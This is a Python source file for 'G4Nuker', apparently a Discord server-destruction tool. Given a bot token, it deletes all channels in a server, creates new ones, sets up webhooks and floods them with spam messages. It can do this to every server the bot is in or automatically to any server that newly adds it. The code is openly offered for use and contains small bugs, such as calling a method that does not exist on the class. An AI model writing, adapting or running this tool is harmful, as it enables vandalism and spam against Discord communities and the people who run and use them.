import os
import re
import requests
import time
import base64
import threading as threadlib
from concurrent.futures import ThreadPoolExecutor
import sys

def rgb(r, g, b):
    return f'\033[38;2;{r};{g};{b}m'

class co:
    g1 = [80, 5, 255]
    g2 = [200, 20, 90]

    main = rgb(80, 5, 255)
    red = rgb(255, 69, 0)
    darkred = rgb(139, 0, 0)
    green = rgb(50, 205, 50)
    blue = rgb(30, 144, 255)
    yellow = rgb(255, 215, 0)
    orange = rgb(255, 140, 0)
    deeporange = rgb(204, 85, 0)
    pink = rgb(255, 105, 180)
    cyan = rgb(0, 255, 255)
    magenta = rgb(255, 0, 255)
    lime = rgb(124, 252, 0)
    teal = rgb(64, 224, 208)
    indigo = rgb(138, 43, 226)
    violet = rgb(238, 130, 238)
    brown = rgb(139, 69, 19)
    grey = rgb(169, 169, 169)
    black = rgb(0, 0, 0)
    white = rgb(255, 255, 255)

    success = rgb(50, 205, 50)  
    error = rgb(255, 69, 0)    
    warning = rgb(255, 215, 0)       
    info = '\033[0m'              
    debug = rgb(169, 169, 169) 
    ratelimited = rgb(255, 215, 0)

    reset = '\033[0m'

class console:
    INFO = 'INFO'
    SUCCESS = 'SUCCESS'
    RATELIMITED = 'RATELIMITED'
    WARNING = 'WARNING'
    ERROR = 'ERROR'
   
    def __init__(self, module='Logging'):
        self.module = module
        self.levelcolors = {
            self.INFO: co.info,
            self.SUCCESS: co.success,
            self.RATELIMITED: co.ratelimited,   
            self.WARNING: co.warning,
            self.ERROR: co.error,
        }
   
    def skibidiprint(self, first, text='No text provided'):
        level = self.INFO
        color = self.levelcolors.get(level, co.main)
        print(f'{co.main}[{co.reset}{first}{co.main}] {co.reset}»{co.reset} {co.main}[{color}{text}{co.main}]{co.reset}')

    def log(self, level=INFO, text='No text provided', extra=''):
        watermark = ''
        color = self.levelcolors.get(level, co.main)
        extras = self.buildextras(level, extra)
        if level != console.INFO:
            levelprint = f'{color}[{level}]'
        else:
            levelprint = f'{co.main}[{co.reset}{level}{co.main}]'
        print(f'{watermark}{co.main}[{co.reset}{self.module}{co.main}] {levelprint} {co.reset}»{co.reset} {co.main}[{color}{text}{co.main}]{extras}{co.reset}')
   
    def buildextras(self, level, extra):
        if level == self.ERROR and extra:
            return f' {co.error}[{co.error}{extra}{co.error}]{co.reset}'
       
        elif extra:
            color = self.levelcolors.get(level, co.main)
            return f' {co.main}[{color}{extra}{co.main}]'
        return ''

    def cls(self):
        os.system('cls')

    def title(self, title):
        os.system(f'title {title}')

    def center(self, text, size):
        text = str(text)
        lines = text.split('\n')
        centeredlines = []
        for line in lines:
            visibleline = re.sub(r'\033\[[0-9;]*m', '', line)
            visiblelength = len(visibleline)
            
            if visiblelength >= size:
                centeredlines.append(line)
            else:
                padding = (size - visiblelength) // 2
                centeredlines.append(' ' * padding + line)
        
        return '\n'.join(centeredlines)

    def printbanner(self):
        banner = fr'''{co.main}
   ________ __  _   __      __            
  / ____/ // / / | / /_  __/ /_____  _____
 / / __/ // /_/  |/ / / / / //_/ _ \/ ___/
/ /_/ /__  __/ /|  / /_/ / ,< /  __/ /    
\____/  /_/ /_/ |_/\__,_/_/|_|\___/_/     ''' 
        banner = self.center(banner, os.get_terminal_size().columns)

        print(banner)

    def input(self, text, expected=str, default=None, choices=None, min_val=None, max_val=None):
        module = f'{co.main}[{co.reset}{self.module}{co.main}] ' if self.module else ''
        watermark = ''
        
        promptparts = [f'{watermark}{module}{co.main}[{co.reset}{text}{co.main}]']
        
        if expected == bool:
            promptparts.append(f'{co.main}({co.reset}{co.green}y{co.reset}/{co.red}n{co.reset}{co.main})')

        elif choices:
            choice_str = '/'.join(str(c) for c in choices)
            promptparts.append(f'{co.main}({co.reset}{choice_str}{co.main})')

        elif expected == int:
            if min_val is not None and max_val is not None:
                promptparts.append(f'{co.main}({co.reset}{min_val}-{max_val}{co.main})')

            elif min_val is not None:
                promptparts.append(f'{co.main}({co.reset}min {min_val}{co.main})')

            elif max_val is not None:
                promptparts.append(f'{co.main}({co.reset}max {max_val}{co.main})')
        
        if default is not None:
            promptparts.append(f'{co.main}[{co.reset}default {default}{co.main}]')
        
        prompt = ' '.join(promptparts) + f' {co.reset}» {co.reset}'
        
        while True:
            result = input(prompt).strip()
            
            if not result and default is not None:
                return default
            
            if not result:
                if expected == str:
                    return result
                else:
                    self.log(console.INFO, f'Input required please enter a value')
                    continue

            if expected == bool:
                if result.lower() in ['y', 'yes', 'true', '1']:
                    return True
                elif result.lower() in ['n', 'no', 'false', '0']:
                    return False
                else:
                    self.log(console.INFO, f'Please enter y/yes/true or n/no/false')
                    continue
            
            if expected == str:
                if choices and result not in choices:
                    choice_str = ', '.join(f'"{c}"' for c in choices)
                    self.log(console.INFO, f'Please choose from {choice_str}')
                    continue
                return result
            
            try:
                converted = expected(result)
                if expected in [int, float]:
                    if min_val is not None and converted < min_val:
                        self.log(console.INFO, f'Value must be at least {min_val}')
                        continue

                    if max_val is not None and converted > max_val:
                        self.log(console.INFO, f'Value must be no more than {max_val}')
                        continue
                
                if choices and converted not in choices:
                    choice_str = ', '.join(str(c) for c in choices)
                    self.log(console.INFO, f'Please choose from {choice_str}')
                    continue
                
                return converted
                
            except ValueError:
                if expected == int:
                    self.log(console.INFO, f'Please enter a whole number (eg 1 42 100)')

                elif expected == float:
                    self.log(console.INFO, f'Please enter a decimal number (eg 1.5 3.14 10.0)',)

                else:
                    self.log(console.INFO, f'Invalid format expected {expected.__name__}')
                continue

    def prep(self):
        self.cls()
        self.printbanner()
        if self.module != None:
            self.title(f'G4Nuker - {self.module} - g4tools.top - discord.gg/spamming - Made by r3ci')
console=console('G4Nuker')

class G4nuker:
    def __init__(self, token):
        self.token = token
        self.clientid = None
        self.servers = []
        self.channels = []
        self.roles = []
        self.serverid = None
        self.webhooks = []
        self.channelscreated = []
        self.getclientid()

    def getclientid(self):
        while True:
            try:
                r = requests.get(
                    'https://discord.com/api/v9/oauth2/applications/@me',
                    headers={'Authorization': f'Bot {self.token}'}
                )
                if r.status_code == 200:
                    data = r.json()
                    self.clientid = data['id']
                    break
                
                elif r.status_code == 429:
                    retry = r.json().get('retry_after', 1)
                    console.log(console.WARNING, f'Rate limited for {retry}s while getting client ID')
                    time.sleep(retry)

                else:
                    console.log(console.ERROR, f'Failed to get client ID error={r.text}')
                    self.clientid = console.input('Client ID', str)
                    break

            except Exception as e:
                console.log(console.ERROR, f'Error getting client ID error={e}')
                self.clientid = console.input('Client ID', str)
                break

    def generateinvite(self):
        return f'https://discord.com/api/oauth2/authorize?client_id={self.clientid}&permissions=8&scope=bot'

    def getservers(self):
        while True:
            try:
                r = requests.get(
                    'https://discord.com/api/v10/users/@me/guilds',
                    headers={'Authorization': f'Bot {self.token}'}
                )
                if r.status_code == 200:
                    perms_map = {
                        1 << 1: 'Kick Members',
                        1 << 2: 'Ban Members',
                        1 << 3: 'Administrator',
                        1 << 4: 'Manage Channels',
                        1 << 5: 'Manage Guild',
                        1 << 13: 'Manage Messages',
                        1 << 28: 'Manage Roles',
                        1 << 29: 'Manage Webhooks',
                        1 << 30: 'Manage Emojis & Stickers',
                        1 << 26: 'Change Nickname',
                        1 << 27: 'Manage Nicknames',
                        1 << 40: 'Moderate Members'
                    }
                    def decodeperms(perm):
                        if perm & (1 << 3):
                            return ['Admin']
                        return [name for bit, name in perms_map.items() if perm & bit]
                    
                    result = []
                    for server in r.json():
                        perms = decodeperms(int(server['permissions']))
                        result.append({
                            'id': server['id'],
                            'name': server['name'],
                            'permissions': perms if perms else ['No Permissions']
                        })

                    self.servers = result
                    return result
                
                elif r.status_code == 429:
                    retry = r.json().get('retry_after', 1)
                    console.log(console.WARNING, f'Rate limited for {retry}s while getting servers')
                    time.sleep(retry)

                else:
                    console.log(console.ERROR, f'Failed to get servers error={r.text}')
                    self.serverid = console.input('Server ID', str)
                    return 'skip'
                
            except Exception as e:
                console.log(console.ERROR, f'Error getting servers error={e}')
                self.serverid = console.input('Server ID', str)
                return 'skip'

    def isinserver(self):
        while True:
            try:
                r = requests.get(
                    'https://discord.com/api/v9/users/@me/guilds',
                    headers={'Authorization': f'Bot {self.token}'}
                )
                if r.status_code == 200:
                    for server in r.json():
                        if server['id'] == self.serverid:
                            return True, server['name']
                    return False, None
                
                elif r.status_code == 429:
                    retry = r.json().get('retry_after', 1)
                    console.log(console.WARNING, f'Rate limited for {retry}s while checking server membership')
                    time.sleep(retry)

                else:
                    console.log(console.ERROR, f'Failed to check server membership error={r.text}')
                    return True, ''
                
            except Exception as e:
                console.log(console.ERROR, f'Error checking server membership error={e}')
                return True, ''

    def getchannels(self):
        while True:
            try:
                r = requests.get(
                    f'https://discord.com/api/v9/guilds/{self.serverid}/channels',
                    headers={'Authorization': f'Bot {self.token}'}
                )
                if r.status_code == 200:
                    channels = []
                    for ch in r.json():
                        channels.append({
                            'id': ch['id'],
                            'name': ch['name'],
                            'type': ch['type']
                        })
                    self.channels = channels
                    break

                elif r.status_code == 429:
                    retry = r.json().get('retry_after', 1)
                    console.log(console.WARNING, f'Rate limited for {retry}s while getting channels')
                    time.sleep(retry)

                else:
                    console.log(console.ERROR, f'Failed to get channels serverid={self.serverid} error={r.text}')
                    self.channels = []
                    break

            except Exception as e:
                console.log(console.ERROR, f'Error getting channels serverid={self.serverid} error={e}')
                self.channels = []
                break

    def deletechannels(self):
        for channel in self.channels[:]:
            self.channels.remove(channel)
            name = channel['name']
            type = channel['type']
            channelid = channel['id']
            while True:
                try:
                    r = requests.delete(
                        f'https://discord.com/api/v9/channels/{channelid}',
                        headers={'Authorization': f'Bot {self.token}'}
                    )
                    if r.status_code in (200, 204):
                        console.log(console.SUCCESS, f'Deleted name={name} type={type} serverid={self.serverid}')
                        break

                    elif r.status_code == 429:
                        retry = r.json().get('retry_after', 1)
                        console.log(console.WARNING, f'Rate limited for {retry}s while deleting name={name} type={type} serverid={self.serverid}')
                        time.sleep(retry)

                    else:
                        console.log(console.ERROR, f'Failed to delete name={name} type={type} serverid={self.serverid} error={r.text}')
                        break

                except Exception as e:
                    console.log(console.ERROR, f'Error deleting name={name} type={type} serverid={self.serverid} error={e}')
                    break

    def getroles(self):
        while True:
            try:
                r = requests.get(
                    f'https://discord.com/api/v9/guilds/{self.serverid}/roles',
                    headers={'Authorization': f'Bot {self.token}'}
                )
                if r.status_code == 200:
                    roles = []
                    for role in r.json():
                        roles.append({'id': role['id'], 'name': role['name']})
                    self.roles = roles
                    break

                elif r.status_code == 429:
                    retry = r.json().get('retry_after', 1)
                    console.log(console.WARNING, f'Rate limited for {retry}s while getting roles')
                    time.sleep(retry)

                else:
                    console.log(console.ERROR, f'Failed to get roles serverid={self.serverid} error={r.text}')
                    self.roles = []
                    break

            except Exception as e:
                console.log(console.ERROR, f'Error getting roles serverid={self.serverid} error={e}')
                self.roles = []
                break

    def deleteroles(self):
        for role in self.roles[:]:
            self.roles.remove(role)
            name = role['name']
            roleid = role['id']
            while True:
                try:
                    r = requests.delete(
                        f'https://discord.com/api/v9/guilds/{self.serverid}/roles/{roleid}',
                        headers={'Authorization': f'Bot {self.token}'}
                    )
                    if r.status_code in (200, 204):
                        console.log(console.SUCCESS, f'Deleted role name={name} serverid={self.serverid}')
                        break

                    elif r.status_code == 429:
                        retry = r.json().get('retry_after', 1)
                        console.log(console.WARNING, f'Rate limited for {retry}s while deleting role name={name} serverid={self.serverid}')
                        time.sleep(retry)

                    else:
                        console.log(console.ERROR, f'Failed to delete role name={name} serverid={self.serverid} error={r.text}')
                        break

                except Exception as e:
                    console.log(console.ERROR, f'Error deleting role name={name} serverid={self.serverid} error={e}')
                    break

    def createchannels(self, _):
        while len(self.channelscreated) < 10:
            try:
                r = requests.post(
                    f'https://discord.com/api/v9/guilds/{self.serverid}/channels',
                    headers={'Authorization': f'Bot {self.token}', 'Content-Type': 'application/json'},
                    json={'name': 'notification', 'type': 0}
                )
                if r.status_code == 201:
                    ch = r.json()
                    self.channelscreated.append({'id': ch['id'], 'name': ch['name'], 'type': ch['type']})
                    self.channels.append({'id': ch['id'], 'name': ch['name'], 'type': ch['type']})
                    console.log(console.SUCCESS, f'Created channel serverid={self.serverid}')

                elif r.status_code == 429:
                    retry = r.json().get('retry_after', 1)
                    console.log(console.WARNING, f'Rate limited for {retry}s while creating channels')
                    time.sleep(retry)

                else:
                    console.log(console.ERROR, f'Failed to create channel serverid={self.serverid} error={r.text}')
                    break

            except Exception as e:
                console.log(console.ERROR, f'Error creating channel serverid={self.serverid} error={e}')
                break

    def leave(self, serverid):
        while True:
            try:
                r = requests.delete(
                    f'https://discord.com/api/v9/users/@me/guilds/{serverid}',
                    headers={'Authorization': f'Bot {self.token}', 'Content-Type': 'application/json'},
                    json={'name': 'Notifier'}
                )
                if r.status_code == 204:
                    console.log(console.SUCCESS, f'Left server serverid={serverid}')
                    break

                elif r.status_code == 429:
                    retry = r.json().get('retry_after', 1)
                    console.log(console.WARNING, f'Rate limited for {retry}s while leaving server serverid={serverid}')
                    time.sleep(retry)

                else:
                    console.log(console.ERROR, f'Failed to leave server serverid={serverid} error={r.text}')
                    break

            except Exception as e:
                console.log(console.ERROR, f'Error leaving server serverid={serverid} error={e}')
                break

    def createwebhooks(self, channel):
        while True:
            try:
                r = requests.post(
                    f'https://discord.com/api/v9/channels/{channel["id"]}/webhooks',
                    headers={'Authorization': f'Bot {self.token}', 'Content-Type': 'application/json'},
                    json={'name': 'Notifier'}
                )
                if r.status_code == 200 or r.status_code == 201:
                    hook = r.json()
                    self.webhooks.append({'id': hook['id'], 'token': hook['token'], 'channel_id': channel['id']})
                    console.log(console.SUCCESS, f'Created webhook channelid={channel["id"]} serverid={self.serverid}')
                    break

                elif r.status_code == 429:
                    retry = r.json().get('retry_after', 1)
                    console.log(console.WARNING, f'Rate limited for {retry}s while creating webhook channelid={channel["id"]} serverid={self.serverid}')
                    time.sleep(retry)

                else:
                    console.log(console.ERROR, f'Failed to create webhook channelid={channel["id"]} serverid={self.serverid} error={r.text}')
                    break

            except Exception as e:
                console.log(console.ERROR, f'Error creating webhook channelid={channel["id"]} serverid={self.serverid} error={e}')
                break

    def spamwebhook(self, hook):
        with open('message.txt', 'r') as f:
            message = f.read()
        sent = 0
        while sent < 15:
            try:
                r = requests.post(
                    f'https://discord.com/api/v9/webhooks/{hook["id"]}/{hook["token"]}',
                    json={'content': message}
                )
                if r.status_code in (200, 204):
                    sent += 1
                    console.log(console.SUCCESS, f'Spammed ({sent}/100) webhookid={hook["id"]} serverid={self.serverid}')

                elif r.status_code == 429:
                    retry = r.json().get('retry_after', 1)
                    console.log(console.WARNING, f'Rate limited {retry}s while spamming webhookid={hook["id"]} serverid={self.serverid}')
                    time.sleep(retry)

                else:
                    console.log(console.ERROR, f'Failed to spam webhookid={hook["id"]} serverid={self.serverid} error={r.text}')
                    break

            except Exception as e:
                console.log(console.ERROR, f'Error spamming webhookid={hook["id"]} serverid={self.serverid} error={e}')
                break

def nukke(serverid, issingle):
    g4nuker = G4nuker(token)
    g4nuker.serverid = serverid

    #g4nuker.getroles()
    #console.log(console.INFO, f'Found {len(g4nuker.roles)} roles, deleting them now!')
    #with ThreadPoolExecutor(max_workers=20) as executor:
    #    executor.map(lambda _: g4nuker.deleteroles(), range(len(g4nuker.roles)))

    maxwork = 20 if issingle else 1
    g4nuker.getchannels()
    #console.log(console.INFO, f'Found {len(g4nuker.channels)} channels, deleting them now!')
    with ThreadPoolExecutor(max_workers=maxwork) as executor:
        executor.map(lambda _: g4nuker.deletechannels(), range(len(g4nuker.channels)))

    maxwork = 10 if issingle else 1
    with ThreadPoolExecutor(max_workers=maxwork) as executor:
        executor.map(g4nuker.createchannels, range(10))
    #console.log(console.INFO, f'Created {len(g4nuker.channels)} channels')

    maxwork = 20 if issingle else 1
    with ThreadPoolExecutor(max_workers=maxwork) as executor:
        executor.map(g4nuker.createwebhooks, g4nuker.channels)
    #console.log(console.INFO, f'Created {len(g4nuker.webhooks)} webhooks')

    maxwork = len(g4nuker.webhooks) if issingle else 1
    with ThreadPoolExecutor(max_workers=maxwork ) as executor:
        executor.map(g4nuker.spamwebhook, g4nuker.webhooks)

while True:
    console.cls()
    console.title('G4Nuker - g4tools.top - discord.gg/spamming - Made by r3ci')
    console.printbanner()
    console.log(console.INFO, 'Made by r3ci, make sure to start the github repository!')
    console.log(console.INFO, 'g4tools.top | discord.gg/spamming | github.com/r3ci')
    with open('bottoken.txt', 'r') as f:
        token = f.read()

    g4nuker = G4nuker(token)
    invitelink = g4nuker.generateinvite()
    while True:
        console.log(console.INFO, f'Bot invite link » {invitelink}')
        print('\n')
        console.skibidiprint('servers', 'Print out all of the servers the bot is in')
        console.skibidiprint('leave', 'Leave a server by serverid')
        console.skibidiprint('nuke', 'Nuke a server by serverid')
        console.skibidiprint('leaveall', 'Leave a server by serverid')
        console.skibidiprint('nukeall', 'Nuke all servers that the bot is in')
        console.skibidiprint('listennuke', 'Listens for new servers and nukes them when detected')
        print('')


        command = console.input('Command', str)
        if command == 'servers':
            servers = g4nuker.getservers()
            for server in servers:
                console.log(console.INFO, f'{server["name"]} » {server["id"]}')

        elif command == 'leave':
            serverid = console.input('Server ID', int)
            g4nuker.leave(serverid)

        elif command == 'nuke':
            serverid = console.input('Server ID', int)
            g4nuker.nukke(serverid, True)

        elif command == 'leaveall':
            servers = g4nuker.getservers()
            for server in servers:
                g4nuker.leave(server["id"])

        elif command == 'nukeall':
            threads = []
            servers = g4nuker.getservers()
            console.log(console.INFO, 'Yes im aware it might be bit slow but otherwise CPU usage would be way too high')
            time.sleep(2.5)
            for server in servers:
                t = threadlib.Thread(target=nukke, args=(server["id"], False, ))
                t.start()
                threads.append(t)
            
            for t in threads:
                t.join()

        elif command == 'listennuke':
            known = {s['id'] for s in g4nuker.getservers()}
            time.sleep(2.5)
            while True:
                servers = g4nuker.getservers()
                current = {s['id'] for s in servers}
                new = current - known
                for s in servers:
                    if s['id'] in new:
                        threadlib.Thread(target=nukke, args=(s['id'], False, )).start()
                known = current
                time.sleep(5)

        print('\n')
        console.log(console.INFO, 'Finished! Enter to continue')
        input('')
        console.cls()
        console.title('G4Nuker - g4tools.top - discord.gg/spamming - Made by r3ci')
        console.printbanner()
        console.log(console.INFO, 'Made by r3ci, make sure to start the github repository!')
        console.log(console.INFO, 'g4tools.top | discord.gg/spamming | github.com/r3ci')
